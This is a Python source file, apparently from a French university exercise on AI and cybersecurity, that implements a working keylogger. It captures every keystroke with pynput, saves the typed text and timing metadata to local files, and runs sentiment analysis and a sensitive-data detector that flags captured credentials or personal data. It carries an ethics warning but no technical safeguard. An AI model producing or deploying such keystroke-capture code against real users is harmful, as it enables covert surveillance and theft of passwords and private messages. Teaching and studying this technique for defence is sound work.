"""
keylogger.py — Partie I : Capture et enregistrement des frappes clavier
TP1 — Intelligence Artificielle & Cybersécurité

AMÉLIORATIONS v2 (pipeline temps réel) :
    - À chaque flush (report()), le texte est analysé en temps réel :
        → sentiment_analyzer  → data/sentiments.json
        → sensitive_detector  → data/detections.json
    - Les métadonnées de frappe sont sauvegardées dans data/metadata.json
    - Flush immédiat si données sensibles détectées (mode alerte)
    - Possibilité de démarrer le keylogger avec le ML chargé (train ou load)

⚠️  USAGE ÉTHIQUE UNIQUEMENT : ce code est fourni dans un cadre pédagogique.
    Toute utilisation sans consentement explicite est illégale (RGPD, Loi Godfrain).
"""

import json
import os
import threading
import time
from datetime import datetime
from pathlib import Path
from pynput import keyboard

# ── Chemins ─────────────────────────────────────────────────────────────────
ROOT = Path(__file__).resolve().parent
DATA = ROOT / "data"
LOG_PATH       = DATA / "log.txt"
METADATA_PATH  = DATA / "metadata.json"
SENTIMENT_PATH = DATA / "sentiments.json"
DETECTION_PATH = DATA / "detections.json"

# ── Variables globales ───────────────────────────────────────────────────────
log: str               = ""
last_key_time: float   = time.time()
keystroke_metadata: list = []
_flush_lock            = threading.Lock()

# ── Modules d'analyse (chargés une fois) ────────────────────────────────────
_ml_model  = None
_ml_scaler = None
_pipeline_ready = False

def _init_pipeline(train_if_missing: bool = True) -> None:
    """Initialise les modules d'analyse IA (chargement ou entraînement)."""
    global _ml_model, _ml_scaler, _pipeline_ready
    try:
        from sensitive_detector import load_ml_classifier, train_ml_classifier
        _ml_model, _ml_scaler = load_ml_classifier()
        if (_ml_model is None) and train_if_missing:
            print("[INFO] Modèle ML absent → entraînement rapide...")
            _ml_model, _ml_scaler = train_ml_classifier()
        _pipeline_ready = True
        print("[INFO] Pipeline IA initialisé.")
    except Exception as e:
        print(f"[AVERTISSEMENT] Pipeline IA non disponible : {e}")


# ── Traitement des touches ────────────────────────────────────────────────────
def processkeys(key) -> None:
    global log, last_key_time

    now               = time.time()
    inter_key_delay   = now - last_key_time
    last_key_time     = now
    char_logged       = ""

    try:
        char_logged = key.char
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char_logged = " ";  log += " "
        elif key == keyboard.Key.enter:
            char_logged = "\n"; log += "\n"
        elif key == keyboard.Key.backspace:
            char_logged = "[BACK]"
            log = log[:-1] if log else log
        elif key == keyboard.Key.tab:
            char_logged = "\t"; log += "\t"

    keystroke_metadata.append({
        "timestamp":       now,
        "datetime":        datetime.fromtimestamp(now).isoformat(),
        "inter_key_delay": round(inter_key_delay, 4),
        "key_type":        _classify_key_type(key),
        "char":            char_logged,
    })


def _classify_key_type(key) -> str:
    try:
        if key.char is not None:
            return "alphanum" if key.char.isalnum() else "special"
    except AttributeError:
        pass
    navigation_keys = {
        keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
        keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_up, keyboard.Key.page_down,
        keyboard.Key.delete, keyboard.Key.backspace, keyboard.Key.tab,
    }
    modifier_keys = {
        keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
        keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
        keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
        keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
    }
    if key in navigation_keys: return "navigation"
    if key in modifier_keys:   return "modifier"
    return "function"


# ── Sauvegarde des métadonnées ────────────────────────────────────────────────
def _save_metadata(new_entries: list) -> None:
    """Sauvegarde les nouvelles métadonnées (mode append)."""
    DATA.mkdir(exist_ok=True)
    existing = []
    if METADATA_PATH.exists():
        try:
            with open(METADATA_PATH, "r", encoding="utf-8") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.extend(new_entries)
    # Garder les 10 000 dernières entrées max
    existing = existing[-10000:]
    with open(METADATA_PATH, "w", encoding="utf-8") as f:
        json.dump(existing, f, ensure_ascii=False)


# ── Pipeline d'analyse temps réel ────────────────────────────────────────────
def _run_realtime_analysis(text: str) -> bool:
    """
    Lance l'analyse sentiment + détection sensible sur le texte capturé.
    Retourne True si des données sensibles ont été détectées.
    """
    if not _pipeline_ready or not text.strip():
        return False

    has_sensitive = False

    try:
        # ── Analyse de sentiment ──
        from sentiment_analyzer import analyze_sentences_from_log, save_sentiment_results
        sentiment_results = analyze_sentences_from_log(text)
        if sentiment_results:
            save_sentiment_results(sentiment_results, str(SENTIMENT_PATH))

        # ── Détection de données sensibles ──
        from sensitive_detector import analyze_text, save_detections
        detection_result = analyze_text(text, _ml_model, _ml_scaler)
        if detection_result["has_sensitive"]:
            has_sensitive = True
            save_detections([detection_result], str(DETECTION_PATH))
            risk = detection_result.get("overall_risk", "INCONNU")
            types = [d["type"] for d in detection_result["detections"]]
            print(f"[ALERTE] Données sensibles détectées ! Risque: {risk} | Types: {types}")

    except Exception as e:
        print(f"[ERREUR] Analyse temps réel : {e}")

    return has_sensitive


# ── Flush périodique ──────────────────────────────────────────────────────────
def report(interval: int = 10) -> None:
    """
    Flush le buffer toutes les `interval` secondes :
    1. Écrit dans log.txt
    2. Lance l'analyse IA temps réel
    3. Sauvegarde les métadonnées de frappe
    """
    global log, keystroke_metadata

    DATA.mkdir(exist_ok=True)

    with _flush_lock:
        current_log      = log
        current_metadata = keystroke_metadata.copy()
        log              = ""
        keystroke_metadata = []

    if current_log:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(f"{timestamp}\n{current_log}\n{'—'*40}\n")
        except IOError as e:
            print(f"[ERREUR] Écriture log.txt : {e}")

        # ── Analyse IA en arrière-plan (non bloquant) ──
        analysis_thread = threading.Thread(
            target=_run_realtime_analysis,
            args=(current_log,),
            daemon=True
        )
        analysis_thread.start()

    if current_metadata:
        metadata_thread = threading.Thread(
            target=_save_metadata,
            args=(current_metadata,),
            daemon=True
        )
        metadata_thread.start()

    # Relancer le timer
    timer = threading.Timer(interval, report, args=[interval])
    timer.daemon = True
    timer.start()


# ── Démarrage ─────────────────────────────────────────────────────────────────
def start(interval: int = 10, enable_ai: bool = True) -> None:
    """
    Démarre le keylogger avec le pipeline IA temps réel.

    Paramètres
    ----------
    interval  : int  — intervalle de flush en secondes (défaut 10)
    enable_ai : bool — active l'analyse IA temps réel (défaut True)
    """
    print(f"[INFO] Keylogger v2 démarré. Log → {LOG_PATH}")
    print(f"[INFO] Pipeline IA : {'activé' if enable_ai else 'désactivé'}")
    print("[INFO] Appuyez sur Ctrl+C pour arrêter.")

    if enable_ai:
        init_thread = threading.Thread(target=_init_pipeline, args=(True,), daemon=True)
        init_thread.start()

    report(interval)

    keyboard_listener = keyboard.Listener(on_press=processkeys)
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == "__main__":
    start(interval=10, enable_ai=True)
